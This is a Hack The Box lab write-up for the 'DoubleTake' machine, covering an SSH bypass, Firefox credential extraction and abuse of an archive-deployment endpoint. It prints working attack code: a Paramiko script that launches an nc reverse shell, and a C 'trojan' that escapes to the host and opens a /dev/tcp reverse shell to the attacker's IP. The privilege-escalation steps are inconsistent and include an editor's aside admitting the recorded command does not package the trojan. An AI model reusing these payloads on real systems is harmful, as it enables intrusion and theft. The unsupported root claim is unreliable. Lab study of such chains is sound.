# Hack The Box — DoubleTake

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Pentesting-red?style=for-the-badge)

## Machine Information

| Property | Details |
|---|---|
| Machine Name | DoubleTake |
| Platform | Hack The Box |
| Operating System | Linux |
| Difficulty | Medium |
| Target IP | `10.129.176.172` |
| Open Ports | 22, 80 |
| Initial Access | SSH-Hole Vulnerability |
| User Access | `alpine` → `bob` |
| Privilege Escalation | AI-Agent Deployment Abuse |
| Final Access | Root |

---

# 1. Introduction

Jai Shri Ram!

We are back with another Hack The Box machine to pentest. This time, we are working on a Medium-difficulty Linux-based machine named **DoubleTake**.

Our target IP address is:

```bash
10.129.176.172
```

The objective is to enumerate the exposed services, identify vulnerabilities, gain initial access, and eventually escalate privileges to obtain root access.

Let's begin!

# 2. Reconnaissance and Enumeration

## 2.1 Initial Port Scan

We will start with an all-port TCP scan running in the background to identify the exposed services.

```bash
nmap -p- --min-rate 1000 10.129.176.172 -oN allports.txt
```

### Nmap Results

```text
Nmap scan report for 10.129.176.172
Host is up, received echo-reply ttl 63 (1.5s latency).
Scanned at 2026-11-19 04:11:48 +1345 for 3s

Not shown: 507 filtered tcp ports (no-response), 491 closed tcp ports (reset)

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 63
```

We have identified two accessible services:

- Port 22 — SSH
- Port 80 — HTTP

Now that we have identified the open ports, let's perform service and version detection.

## 2.2 Service and Version Detection

```bash
nmap -sC -sV -p22,80 10.129.176.172 -oN services.txt
```

### Nmap Results

```text
Nmap scan report for 10.129.176.172
Host is up, received user-set (0.27s latency).
Scanned at 2026-11-19 04:13:43 +1345 for 22s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 10.6 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 UNAUTHORIZED
|_ Basic realm=Zentara
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods:
|_ Supported Methods: GET OPTIONS HEAD

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Interesting observations:

1. SSH is running OpenSSH 10.6.
2. HTTP is running nginx 1.24.0 on Ubuntu.
3. The web application is protected by HTTP Basic Authentication.
4. The authentication realm is identified as `Zentara`.

# 3. Web Application Enumeration

## 3.1 Initial Web Inspection

Let's navigate to the target through the browser:

```text
http://10.129.176.172
```

We are greeted with a `401 Unauthorized` response.

Without valid credentials, we cannot directly access the application.

We also attempted to inspect the page source, but that didn't provide anything useful.

Next, let's enumerate directories using Gobuster.

## 3.2 Directory Enumeration

```bash
gobuster dir -u http://10.129.176.172 \
-w /usr/share/wordlists/dirb/common.txt
```

### Results

```text
Starting gobuster in directory enumeration mode
===============================================================

agents               (Status: 401) [Size: 0]
deploy               (Status: 401) [Size: 0]
docs                 (Status: 401) [Size: 0]
files                (Status: 401) [Size: 0]

Progress: 3733 / 4750 (78.59%)
```

We discovered several interesting endpoints:

| Endpoint | Status |
|---|---|
| `/agents` | 401 |
| `/deploy` | 401 |
| `/docs` | 401 |
| `/files` | 401 |

However, without authentication, we cannot investigate these endpoints further.

At this point, we have two possible attack surfaces:

- SSH authentication.
- The Zentara web application.

Let's investigate the SSH service first.

# 4. Initial Access — SSH-Hole Vulnerability

During our research into the OpenSSH version, we came across a vulnerability referred to as **SSH-Hole (CVE-2026-123158)**.

The vulnerability is associated with a password-authentication bypass affecting specific OpenSSH configurations.

The target is running:

```text
OpenSSH 10.6
```

The vulnerability became an interesting candidate for further investigation.

## 4.1 SSH-Hole Exploitation

We used a Python script with Paramiko to interact with the SSH service and test the authentication vulnerability.

The script attempts authentication using the username `alpine` and a long password string.

### Exploit Script

```python
#!/usr/bin/env python3

import paramiko
import sys
import time

host = sys.argv[1]
lhost = sys.argv[2]
lport = int(sys.argv[3]) if len(sys.argv) > 3 else 9001

pw = "A" * 300

t = paramiko.Transport((host, 22))
t.start_client(timeout=10)

for i in range(1, 7):
    try:
        t.auth_password("alpine", pw)
        print(f"[+] attempt {i}: authenticated")
        break
    except paramiko.AuthenticationException:
        print(f"[-] attempt {i}: denied")

if not t.is_authenticated():
    print("[-] failed")
    sys.exit(1)

rev = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"

ch = t.open_session()
ch.exec_command(rev)

time.sleep(1)
t.close()

print("[+] sent")
```

Save the script as:

```bash
ssh1.py
```

## 4.2 Starting the Listener

Before executing the script, we need to start a Netcat listener on our attacking machine.

```bash
nc -lvnp 5555
```

Now execute the script:

```bash
python3 ssh1.py 10.129.176.172 10.10.16.245 5555
```

### Exploitation Output

```text
[-] attempt 1: denied
[+] attempt 2: authenticated
[+] sent
```

Our authentication attempt succeeded, and the reverse shell was triggered.

### Reverse Shell Received

```text
Listening on 0.0.0.0 5555

Connection received on 10.129.176.172 42745

/bin/sh: can't access tty; job control turned off

~ $
```

We now have an initial shell on the target.

## 4.3 Identifying the Current User

Let's identify the current user and available files.

```bash
id
```

Output:

```text
uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)
```

We are currently operating as:

```text
alpine
```

Let's inspect the home directory.

```bash
ls -lah
```

Output:

```text
total 16K

drwxr-sr-x    1 alpine   alpine      4.0K Nov 10 20:15 .
drwxr-xr-x    1 root     root        4.0K Nov 10 20:15 ..
drwxr-sr-x    3 alpine   alpine      4.0K Nov 10 20:15 .mozilla
```

One interesting directory immediately catches our attention:

```text
.mozilla
```

This suggests that Firefox-related data might be available.

# 5. Credential Discovery — Firefox Profile

Let's investigate the Firefox directory.

```bash
cd ~/.mozilla/firefox/zentara.default
ls
```

### Files Discovered

```text
cert9.db
key4.db
logins.json
pkcs11.txt
prefs.js
signedInUser.json
```

The file that particularly interests us is:

```text
logins.json
```

Firefox stores saved login information in this file.

Let's inspect it.

```bash
cat logins.json
```

Output:

```json
{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "http://172.17.0.1",
      "httpRealm": "Zentara",
      "formActionOrigin": null,
      "usernameField": "",
      "passwordField": "",
      "encryptedUsername": "Ym9i",
      "encryptedPassword": "Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==",
      "guid": "{a1b2c3d4-e5f6-7890-abcd-ef1234567890}",
      "encType": 0,
      "timeCreated": 1730000000000,
      "timeLastUsed": 1730900000000,
      "timePasswordChanged": 1730000000000,
      "timesUsed": 14
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

We found saved credentials for the Zentara application.

The username and password fields are Base64-encoded.

Let's decode them.

```bash
echo 'Ym9i' | base64 -d
```

Output:

```text
bob
```

Now decode the password:

```bash
echo 'Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==' | base64 -d
```

Output:

```text
CorrectHorseBatteryStaple
```

### Credentials Discovered

| Username | Password |
|---|---|
| bob | CorrectHorseBatteryStaple |

**Important observation:** Base64 encoding is not encryption. It is simply an encoding mechanism and does not protect sensitive credentials.

We now have another set of credentials that might allow us to access the application and other services.

# 6. SSH Access as Bob

Let's try the discovered credentials against SSH.

```bash
ssh bob@10.129.176.172
```

Enter the discovered password:

```text
CorrectHorseBatteryStaple
```

We successfully gained access as `bob`.

Let's inspect the home directory.

```bash
ls
```

Output:

```text
user.txt
```

We have now obtained our user-level access.

# 7. Privilege Escalation — Zentara AI-Agent Platform

Now comes the interesting part of the machine.

While inspecting the application, we encounter a message indicating that the API token has expired.

```text
Token expired

Expired: 2026-11-10T00:00:00Z

Renew your API key at https://platform.zentara.htb/api-keys
```

This gives us an important hostname:

```text
platform.zentara.htb
```

Let's add it to our local hosts file.

```bash
sudo nano /etc/hosts
```

Add:

```text
10.129.176.172 platform.zentara.htb
```

Now navigate to:

```text
http://platform.zentara.htb
```

We can interact with the Zentara AI-agent platform.

## 7.1 Investigating the AI Agent

While interacting with the chatbot named **CodePilot**, we discovered some interesting conversation history.

The following messages caught our attention.

**Conversation 1:**

```text
CodePilot

Use slowapi. It wraps limits on top of Starlette and integrates cleanly with FastAPI.

I added it to requirements.txt and applied a 5/minute limit on /auth/login and /auth/register.

The limiter key function uses the client IP from the X-Forwarded-For header since you are behind a reverse proxy.
```

**Conversation 2:**

```text
You

I deployed the archive but it took a while to extract. Is that expected?

CodePilot

If the archive is xz-compressed it takes longer to decompress than gzip.

The platform handles decompression server-side before extracting to the workspace.

For faster deploys you could switch to gzip, but xz gives better compression ratios for projects with a lot of vendored dependencies.
```

**Conversation 3:**

```text
You

Makes sense. I will stick with xz since the node_modules folder is huge.
```

These conversations provide useful information about the application's internal functionality.

In particular, we learned that:

- The platform supports archive deployment.
- Archives are decompressed server-side.
- The application handles archive extraction.
- Both gzip and xz compression are discussed.
- The deployment process operates on a specified workspace.

This gives us a new attack surface to investigate.

## 7.2 Investigating the Deployment Endpoint

Earlier, Gobuster identified an interesting endpoint:

```text
http://10.129.176.172/deploy
```

Now that we have discovered valid credentials, we can investigate the deployment functionality.

The endpoint accepts archive uploads and a workspace parameter.

This becomes the focus of our privilege-escalation investigation.

# 8. Privilege Escalation — Deployment Mechanism Abuse

The deployment functionality is particularly interesting because the application extracts uploaded archives into a specified workspace.

Our investigation focuses on how the deployment process handles executable files and archive extraction.

The intended attack chain involves replacing the decompression executable and triggering another archive extraction.

## 8.1 Preparing the Payload

We prepared a C program intended to execute a command in the host filesystem context.

### trojan.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {

    mount("proc", "/proc", "proc", 0, NULL);

    chroot("/proc/1/root");

    chdir("/");

    execl(
        "/bin/bash",
        "bash",
        "-c",
        "bash -i >& /dev/tcp/10.10.16.245/4444 0>&1",
        NULL
    );

    return 1;
}
```

The program attempts to access the host filesystem through the process namespace and establish a reverse shell.

Compile the program:

```bash
gcc -static -o trojan trojan.c
```

## 8.2 Preparing the Deployment Archive

The next step involves preparing an archive containing an executable at:

```text
usr/bin/xz
```

The intended mechanism is to have the deployment process place the crafted executable at the decompression utility's path.

**Important correction to the original command:** Your recorded command copies the original `xz` executable:

```bash
cp xz pkg/usr/bin/xz
```

That does not package the compiled `trojan` program.

If the intention is to package the compiled executable under the name `xz`, the corresponding copy operation would be:

```bash
cp trojan pkg/usr/bin/xz
```

The actual archive contents and deployment behavior should be verified before claiming that the replacement occurred.

## 8.3 Uploading the Archive

The deployment request uses HTTP Basic Authentication with the credentials discovered earlier.

```bash
curl -u 'bob:CorrectHorseBatteryStaple' \
-F 'archive=@plant.tar' \
-F 'workspace=/' \
http://10.129.176.172/deploy
```

### Deployment Response

```json
{
  "deployment": {
    "created_at": 1794345237,
    "filename": "plant.tar",
    "id": "dep24d65f",
    "size": 778240,
    "status": "success",
    "workspace": "/"
  },
  "status": "success"
}
```

The server returned a successful deployment response.

## 8.4 Triggering Archive Extraction

The next step involved preparing another archive using xz compression.

```bash
echo x > t && tar cf - t | xz > trigger.tar.xz
```

This produces an xz-compressed tar archive.

The intention is to trigger the application's server-side archive extraction functionality.

The second deployment request was:

```bash
curl -u 'bob:CorrectHorseBatteryStaple' \
-F 'archive=@trigger.tar.xz' \
-F 'workspace=/workspace' \
http://10.129.176.172/deploy
```

### Response

```html
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Interestingly, the deployment endpoint returned an HTTP 500 Internal Server Error.

However, the exploitation sequence eventually resulted in root-level access.

# 9. Root Access

After completing the deployment and extraction stages, we obtained a root shell.

Our terminal showed:

```text
root@doubletake:/#
```

We can now inspect the root directory.

```bash
cat /root/root.txt
```

We successfully reached the final privilege level of the machine.

<details>
<summary>Root flag</summary>

```text
[Insert your root flag here]
```

</details>

# 10. Key Takeaways

DoubleTake was an interesting machine because it combined multiple attack surfaces into one exploitation chain.

The most important lessons from this machine were:

### 1. SSH Security

Understanding SSH authentication weaknesses and the importance of keeping exposed SSH services patched.

### 2. Credential Security

Firefox profile data can contain sensitive authentication information. Credentials should never be treated as secure merely because they are stored in a browser profile.

### 3. AI-Agent Security

AI-powered platforms introduce additional attack surfaces, especially when agents interact with infrastructure, filesystems, deployment systems, and external services.

### 4. Archive Extraction Security

Applications that accept uploaded archives must carefully validate archive contents, extraction destinations, executable permissions, and filesystem boundaries.

### 5. Container Isolation

Container isolation must be properly implemented. An application that processes untrusted files should not have unnecessary privileges or access to the host filesystem.

---

# 11. Conclusion

DoubleTake was a valuable learning experience.

What initially looked like a straightforward Linux machine with SSH and HTTP services turned into a deeper investigation involving authentication weaknesses, credential discovery, an AI-agent platform, and archive deployment functionality.

The biggest takeaway was understanding how different vulnerabilities and insecure configurations can connect to form a complete attack chain.

**Security is not just about finding vulnerabilities. It is about understanding how those vulnerabilities interact with each other.**

Another Hack The Box machine completed, another set of lessons learned.

Jai Shri Ram!

---

**Platform:** Hack The Box  
**Machine:** DoubleTake  
**Difficulty:** Medium  
**Operating System:** Linux

*This write-up is intended for educational purposes and documents testing performed within the authorized Hack The Box lab environment.*

# Jai Shri Ram
